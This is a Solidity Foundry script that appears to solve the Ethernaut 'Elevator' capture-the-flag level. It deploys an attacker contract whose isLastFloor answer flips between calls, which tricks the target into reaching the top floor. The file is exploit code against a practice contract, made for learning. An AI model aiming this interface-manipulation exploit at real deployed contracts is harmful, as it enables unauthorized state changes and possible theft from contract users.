// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IElevator {
    function goTo(uint256 floor) external;
}

contract ElevatorAttack is Constants {
    bool answer;
    uint256 private constant targetFloor = 2;

    /**
    * @notice The first time the function is called it will say it's not the first floor. All subsequent times, it will say it's the last floor.
    */
    function isLastFloor(uint256 _floor) external returns (bool) {
        bool result = answer;
        answer = true;
        return result;
    }
    
    function attack() public {
        IElevator victim = IElevator(ELEVATOR_ADDRESS);
        victim.goTo(targetFloor);
    }
}

contract ElevatorAttacker is Constants, Script {

    function run() public {
        IElevator victim = IElevator(ELEVATOR_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        attack();
        vm.stopBroadcast();
    }
    
    function attack() private {
        ElevatorAttack _attack = new ElevatorAttack();
        _attack.attack();
    }
}